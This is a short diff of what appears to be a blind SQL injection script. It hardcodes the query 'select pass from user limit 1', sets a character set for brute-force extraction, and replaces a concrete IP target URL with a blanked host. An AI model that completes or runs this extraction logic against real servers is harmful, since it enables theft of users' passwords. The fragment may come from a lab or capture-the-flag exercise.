@@ -4,7 +4,7 @@ import sys
 # query=sys.argv[1]
 query = "select pass from user limit 1"
 res = ''
-url = "http://138.68.169.56:8900/user/"
+url = "http://:8900/user/"
 charset="._-:@abcdefghijklmnopqrstuvwxyz"
 restart = True
 while restart:
